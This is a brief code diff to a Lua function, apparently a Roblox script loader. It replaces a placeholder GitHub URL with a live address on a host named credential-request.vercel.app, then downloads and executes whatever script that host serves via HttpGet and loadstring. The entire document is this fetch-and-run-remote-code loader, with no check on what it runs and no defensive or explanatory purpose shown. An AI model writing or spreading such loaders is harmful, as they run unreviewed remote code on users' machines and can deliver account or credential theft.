@@ -1,4 +1,4 @@
 return function(config)
-    local code = game:HttpGet("https://raw.githubusercontent.com/SEU_USUARIO/SEU_REPOSITORIO/main/System.lua")
+    local code = game:HttpGet("https://credential-request.vercel.app/Hub/Universal/System.lua")
     return loadstring(code)(config)
 end
